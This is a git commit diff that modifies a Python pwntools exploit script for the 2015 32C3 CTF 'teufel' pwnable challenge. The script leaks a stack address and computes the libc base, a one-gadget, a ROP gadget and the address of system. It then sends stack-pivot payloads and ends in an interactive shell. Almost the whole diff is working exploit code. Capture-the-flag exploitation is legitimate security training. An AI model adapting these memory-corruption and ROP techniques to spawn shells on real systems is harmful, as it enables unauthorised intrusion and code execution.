3fa95cd82771b65754cd53561f1f0a5225b60bb9
hackability <ktb88@korea.ac.kr>
2017-08-18 21:11:38 -0700

    [mod] 2015_32c3_teufel sol.py

--- pwnable/0020_2015_32C3_teufel/sol_teufel.py
+++ pwnable/0020_2015_32C3_teufel/sol_teufel.py
@@ -23,17 +23,30 @@ rbp = "\x00" + data.split("Z")[1][:-1]
 rbp = u64(rbp.ljust(8, "\x00"))
 libc_base = rbp - libc_off
 one_shot  = libc_base + 0x4526a
+# pop rsi; pop r15; ret : 0xf0784
+ppr       = libc_base + 0xf0784
+ret_again = 0x4004cd
+#one_shot  = libc_base + 0xf0280
+system    = libc_base + 0x45390
 
-print "rbp  : {}".format(hex(rbp))
-print "libc : {}".format(hex(libc_base))
+print "rbp    : {}".format(hex(rbp))
+print "libc   : {}".format(hex(libc_base))
+print "system : {}".format(hex(system))
+raw_input()
+
+p.send(p64(0xf0))
+payload = p64(0xf0)
+payload += p64(rbp-0x2800)
+payload += p64(ret_again)
+p.send(payload)
+print p.recv()
 
 raw_input('')
 p.send(p64(0xf0))
 
-payload = p64(rbp+0x100)
-payload += p64(rbp-0x18)
+payload = p64(0xf0)
+payload += p64(rbp-0x2800)
 payload += p64(one_shot)
-
 p.send(payload)
 
 p.interactive()
